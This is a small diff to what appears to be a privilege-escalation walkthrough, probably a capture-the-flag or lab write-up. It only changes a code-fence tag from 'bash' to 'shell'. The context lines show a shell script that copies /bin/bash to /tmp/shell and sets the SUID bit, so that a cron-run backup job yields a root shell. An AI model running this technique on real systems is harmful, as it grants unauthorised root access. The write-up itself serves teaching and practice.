@@ -231,7 +231,7 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 - Move to backup file.
 - Create a shell file which will copy bash to `/tmp`, and will give it SUID rights.
 
-```bash
+```shell
 #!/bin/bash
 cp /bin/bash /tmp/shell
 chmod +s /tmp/shell
